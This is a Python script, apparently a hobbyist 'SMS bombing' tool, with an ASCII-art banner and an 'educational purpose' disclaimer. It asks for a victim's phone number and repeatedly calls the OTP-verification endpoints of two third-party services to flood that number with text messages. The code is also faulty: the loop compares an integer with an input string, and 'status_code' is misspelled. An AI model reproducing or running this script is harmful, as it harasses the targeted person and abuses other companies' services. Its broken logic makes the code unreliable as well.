import os
import sys
import time

def slow(ab):
	for c in ab:
		sys.stdout.write(c)
		sys.stdout.flush()
		time.sleep(0.1)

os.system("clear")

print("\n\n\n")
slow("		System Loading....")

print("\n\n\n")
time.sleep(3)

os.system("clear")
print("\n\n\n")
slow("		\33[1;32mSuccessfully Loaded...\33[0m")


print("\n\n\n")
time.sleep(3)
#os.system("clear")
name=input("	Enter Your Name: \33[1;32m")

slow("	\33[1;33mWELCOME \33[1;32m"+name+" \33[1;33mTO THE WORLD OF RADIAN QUADRO")

print("\n")
os.system("clear")
print ("""
\33[1;32m

	.-" ---- "-.
       /            \\
      |              |
      |,  .-.  .-.  ,|
      | )(_o/  \\o_)( |
      |/     /\\     \\|
      (_     ^^     _)
       \\__|IIIIII|__/
        | \IIIIII/ |
        \\          /
         `--------`
	
		
	\33[1;31m		
▗▄▄▖  ▗▄▖ ▗▄▄▄ ▗▄▄▄▖ ▗▄▖ ▗▖  ▗▖    
▐▌ ▐▌▐▌ ▐▌▐▌  █  █  ▐▌ ▐▌▐▛▚▖▐▌    
▐▛▀▚▖▐▛▀▜▌▐▌  █  █  ▐▛▀▜▌▐▌ ▝▜▌    
▐▌ ▐▌▐▌ ▐▌▐▙▄▄▀▗▄█▄▖▐▌ ▐▌▐▌  ▐▌    
                                   
                                   
                                   
▗▄▄▄▖ ▗▖ ▗▖ ▗▄▖ ▗▄▄▄ ▗▄▄▖  ▗▄▖     
▐▌ ▐▌ ▐▌ ▐▌▐▌ ▐▌▐▌  █▐▌ ▐▌▐▌ ▐▌    
▐▌ ▐▌ ▐▌ ▐▌▐▛▀▜▌▐▌  █▐▛▀▚▖▐▌ ▐▌    
▐▙▄▟▙▖▝▚▄▞▘▐▌ ▐▌▐▙▄▄▀▐▌ ▐▌▝▚▄▞▘    
                                   
  

""")


print("\33[1;33m=====================================================")
print("owner: RADIAN QUADRO")
print("Github: Somthing...")
print("Facebook: @radianquadro")
slow("Tools: SMS BOOMBING")

slow("\33[1;32m\n\tThis Tools is only for Educational Purpose Make By Sir \33[1;33mMohammad Fahimur Rahman(Radian Quadro)\33[1;32m")
print("====================================================")







import requests
num = input("Enter A Vaild Number (without +88):  ")
am = input("Enter Amount :  ")

sent=0
while sent>am:
	response = requests.get('https://apibeta.iqra-live.com/api/v2/sent-otp/'+num)
	if response.ststus_code==200:
		sent+=1
		print(f"{sent}. Sms sent successfully")
	
	else:
		pass
	
	response = requests.get('https://bikroy.com/data/phone_number_login/verifications/phone_login?phone='+num)
	if response.ststus_code==200:
		sent+=1
		print(f"{sent}. Sms sent successfully")
	else:
		pass

	
slow("Thanks For Using Our Tools")